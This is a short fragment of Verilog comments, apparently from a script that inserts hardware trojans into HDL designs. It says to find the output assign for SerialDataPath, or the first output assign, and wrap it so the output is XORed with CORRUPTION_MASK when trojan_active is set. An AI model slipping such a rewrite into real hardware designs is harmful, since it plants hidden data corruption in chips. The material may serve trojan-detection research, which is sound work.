...
//
// IMPORTANT: SerialDataPath may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If SerialDataPath is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for SerialDataPath (or first output assign):
//     assign SerialDataPath = <expr>;
//   Replace with:
//     assign SerialDataPath = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
